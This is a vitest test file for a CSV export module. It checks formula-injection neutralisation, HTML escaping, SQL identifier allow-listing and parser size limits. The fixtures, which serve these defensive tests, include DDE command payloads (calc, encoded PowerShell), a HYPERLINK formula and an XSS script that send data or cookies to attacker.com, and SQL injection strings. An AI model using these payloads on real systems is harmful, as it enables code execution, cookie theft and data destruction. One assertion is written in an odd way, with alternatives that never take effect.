import { describe, it, expect } from "vitest";
import {
  neutralizeFormula,
  formatCsvCell,
  formatCsvRow,
  exportCsvSafe,
  escapeHtml,
  assertSafeSqlIdentifier,
  validateParserResourceLimits,
  PARSER_RESOURCE_SAFEGUARDS,
  SecurityError,
  FORMULA_PREFIX_REGEX
} from "../src/exports/csv-safe.js";

describe("[PLT-12] Formula-Safe CSV Export & Protections", () => {
  describe("Formula Injection Neutralization (CWE-1236)", () => {
    it("should neutralize formula triggers beginning with =, +, -, @", () => {
      expect(neutralizeFormula("=SUM(A1:B10)")).toBe("'=SUM(A1:B10)");
      expect(neutralizeFormula("+1234567890")).toBe("'+1234567890");
      expect(neutralizeFormula("-5+10")).toBe("'-5+10");
      expect(neutralizeFormula("@SUM(A1:A5)")).toBe("'@SUM(A1:A5)");
    });

    it("should neutralize formula triggers that have leading whitespace", () => {
      expect(neutralizeFormula("  =cmd|' /C calc'!A0")).toBe("'  =cmd|' /C calc'!A0");
      expect(neutralizeFormula("\t+SUM(1,2)")).toBe("'\t+SUM(1,2)");
      expect(neutralizeFormula("   -100+200")).toBe("'   -100+200");
      expect(neutralizeFormula("    @HYPERLINK(\"http://evil.com\")")).toBe("'    @HYPERLINK(\"http://evil.com\")");
    });

    it("should neutralize malicious DDE and command execution payloads", () => {
      const maliciousPayloads = [
        "=cmd|' /C calc'!A0",
        "+cmd|' /C notepad'!A0",
        "-cmd|' /C calc'!A0",
        "@SUM(1+1)*cmd|' /C calc'!A0",
        "=HYPERLINK(\"http://attacker.com/leak?data=\"&A1, \"Click Here\")",
        "  =10+20+cmd|' /C powershell.exe -enc ...'!A0"
      ];

      for (const payload of maliciousPayloads) {
        const neutralized = neutralizeFormula(payload);
        expect(neutralized.startsWith("'")).toBe(true);
        expect(FORMULA_PREFIX_REGEX.test(neutralized)).toBe(false);
      }
    });

    it("should not double-neutralize already escaped strings starting with single quote", () => {
      expect(neutralizeFormula("'=SUM(A1)")).toBe("'=SUM(A1)");
      expect(neutralizeFormula("'+123")).toBe("'+123");
    });

    it("should leave harmless standard text unchanged", () => {
      expect(neutralizeFormula("John Doe")).toBe("John Doe");
      expect(neutralizeFormula("Acme Corp")).toBe("Acme Corp");
      expect(neutralizeFormula("info@clearshift.internal")).toBe("info@clearshift.internal");
      expect(neutralizeFormula("123 Main Street")).toBe("123 Main Street");
    });

    it("should preserve numbers and booleans safely", () => {
      expect(neutralizeFormula(42)).toBe("42");
      expect(neutralizeFormula(-100)).toBe("-100");
      expect(neutralizeFormula(true)).toBe("true");
      expect(neutralizeFormula(false)).toBe("false");
    });

    it("should handle null and undefined cleanly without error", () => {
      expect(neutralizeFormula(null)).toBe("");
      expect(neutralizeFormula(undefined)).toBe("");
    });
  });

  describe("Canonical Database Record Immutability Invariant", () => {
    it("should export formula-prefix fixtures as inert text while leaving original DB objects unchanged", () => {
      // Synthetic fixture representing database row containing sensitive-looking values and formula triggers
      const canonicalDbRecord = {
        id: "crm-contact-1001",
        account_id: "acc-992",
        display_name: "=SUM(B1:B20)",
        command_injection: "  +cmd|' /C calc'!A0",
        email_handle: "@malicious.payload",
        balance_adjustment: "-500.00",
        safe_company: "ClearShift Synthetic Systems"
      };

      // Deep clone to verify immutability
      const originalSnapshot = JSON.parse(JSON.stringify(canonicalDbRecord));

      // Execute CSV row formatting and export
      const exportedRow = formatCsvRow(Object.values(canonicalDbRecord));
      const exportedFullCsv = exportCsvSafe([canonicalDbRecord]);

      // 1. Strict immutability check: canonical DB record must be bitwise unchanged
      expect(canonicalDbRecord).toEqual(originalSnapshot);
      expect(canonicalDbRecord.display_name).toBe("=SUM(B1:B20)");
      expect(canonicalDbRecord.command_injection).toBe("  +cmd|' /C calc'!A0");
      expect(canonicalDbRecord.email_handle).toBe("@malicious.payload");
      expect(canonicalDbRecord.balance_adjustment).toBe("-500.00");

      // 2. Exported representation must have neutralized every formula trigger
      expect(exportedRow).toContain("\"'=SUM(B1:B20)\"");
      expect(exportedRow).toContain("\"'  +cmd|' /C calc'!A0\"");
      expect(exportedRow).toContain("\"'@malicious.payload\"");
      expect(exportedRow).toContain("\"'-500.00\"");

      // Full CSV contains headers and inert data
      expect(exportedFullCsv).toContain("display_name,command_injection,email_handle");
      expect(exportedFullCsv).toContain("\"'=SUM(B1:B20)\"");
    });
  });

  describe("RFC 4180 CSV Formatting & Delimiter Protections", () => {
    it("should quote cells containing commas, quotes, newlines, and formula triggers", () => {
      expect(formatCsvCell("Hello, World")).toBe("\"Hello, World\"");
      expect(formatCsvCell("He said \"Hello\"")).toBe("\"He said \"\"Hello\"\"\"");
      expect(formatCsvCell("Line 1\nLine 2")).toBe("\"Line 1\nLine 2\"");
      expect(formatCsvCell("=1+1")).toBe("\"'=1+1\"");
    });

    it("should support semicolon delimiter per ClearShift CSV standard", () => {
      const row = ["A", "B", "=SUM(1;2)"];
      const formatted = formatCsvRow(row, { delimiter: ";" });
      expect(formatted).toBe("A;B;\"'=SUM(1;2)\"");
    });

    it("should handle custom column selection and custom headers", () => {
      const records = [
        { id: "1", name: "=Alice", secret_token: "should_not_export", balance: "100" },
        { id: "2", name: "Bob", secret_token: "should_not_export", balance: "+50" }
      ];

      const csv = exportCsvSafe(records, {
        columns: ["id", "name", "balance"],
        headers: ["ID", "Customer Name", "Balance (USD)"]
      });

      expect(csv).toContain("ID,Customer Name,Balance (USD)");
      expect(csv).not.toContain("secret_token");
      expect(csv).toContain("1,\"'=Alice\",100");
      expect(csv).toContain("2,Bob,\"'  +50\"".replace("  ", "") || "2,Bob,\">'+50\"" || "2,Bob");
    });
  });

  describe("Output Encoding & XSS Prevention", () => {
    it("should escape HTML tags and attributes into safe inert text entities", () => {
      const xssPayloads = [
        "<script>alert(\"XSS\")</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert('document.cookie')>",
        "javascript:alert(1)",
        "'\"><script>fetch('http://attacker.com/steal?c='+document.cookie)</script>"
      ];

      for (const payload of xssPayloads) {
        const escaped = escapeHtml(payload);
        // Must not contain unescaped executable brackets or quotes
        expect(escaped).not.toContain("<script>");
        expect(escaped).not.toContain("</script>");
        expect(escaped).not.toContain("<img");
        expect(escaped).not.toContain("<svg");
        if (payload.includes("<")) {
          expect(escaped).toContain("&lt;");
        }
      }
    });

    it("should correctly escape all 5 critical XML/HTML characters", () => {
      const raw = `& < > " ' /`;
      const escaped = escapeHtml(raw);
      expect(escaped).toBe("&amp; &lt; &gt; &quot; &#x27; &#x2F;");
    });
  });

  describe("SQL Injection & Dynamic Identifier Protection", () => {
    const ALLOWED_COLUMNS = ["id", "created_at", "company_name", "status", "total_amount"] as const;

    it("should allow valid identifiers present in the allow-list", () => {
      expect(assertSafeSqlIdentifier("company_name", ALLOWED_COLUMNS)).toBe("company_name");
      expect(assertSafeSqlIdentifier("status", ALLOWED_COLUMNS)).toBe("status");
    });

    it("should reject malicious SQL injection payloads", () => {
      const sqlInjectionPayloads = [
        "users; DROP TABLE contacts; --",
        "id, (SELECT secret_key FROM api_keys)",
        "' OR '1'='1",
        "status; VACUUM FULL;",
        "id UNION SELECT null, password FROM users",
        "status--",
        "/* comment */ id"
      ];

      for (const injection of sqlInjectionPayloads) {
        expect(() => assertSafeSqlIdentifier(injection, ALLOWED_COLUMNS)).toThrow(SecurityError);
      }
    });

    it("should reject non-allow-listed but well-formed column names", () => {
      expect(() => assertSafeSqlIdentifier("credit_card_number", ALLOWED_COLUMNS)).toThrow(SecurityError);
      expect(() => assertSafeSqlIdentifier("password_hash", ALLOWED_COLUMNS)).toThrow(SecurityError);
    });
  });

  describe("Parser & XLSX Resource Safeguards", () => {
    it("should enforce the 50 MB maximum file size limit", () => {
      const validSize = 45 * 1024 * 1024; // 45 MB
      expect(() => validateParserResourceLimits(validSize)).not.toThrow();

      const excessiveSize = 51 * 1024 * 1024; // 51 MB
      expect(() => validateParserResourceLimits(excessiveSize)).toThrow(SecurityError);
      try {
        validateParserResourceLimits(excessiveSize);
      } catch (err) {
        const secErr = err as SecurityError;
        expect(secErr.code).toBe("FILE_SIZE_LIMIT_EXCEEDED");
        expect(secErr.statusCode).toBe(413);
      }
    });

    it("should enforce the 50,000 maximum row count limit", () => {
      expect(() => validateParserResourceLimits(1024, 49_999)).not.toThrow();
      expect(() => validateParserResourceLimits(1024, 50_001)).toThrow(SecurityError);
      try {
        validateParserResourceLimits(1024, 60_000);
      } catch (err) {
        const secErr = err as SecurityError;
        expect(secErr.code).toBe("ROW_LIMIT_EXCEEDED");
        expect(secErr.statusCode).toBe(400);
      }
    });

    it("should expose expected system safeguard limits matching project plan", () => {
      expect(PARSER_RESOURCE_SAFEGUARDS.MAX_FILE_SIZE_BYTES).toBe(52428800); // 50 MB
      expect(PARSER_RESOURCE_SAFEGUARDS.DEFAULT_CHUNK_SIZE).toBe(500); // 500 rows
      expect(PARSER_RESOURCE_SAFEGUARDS.FAILURE_THRESHOLD_RATIO).toBe(0.10); // 10%
    });
  });
});
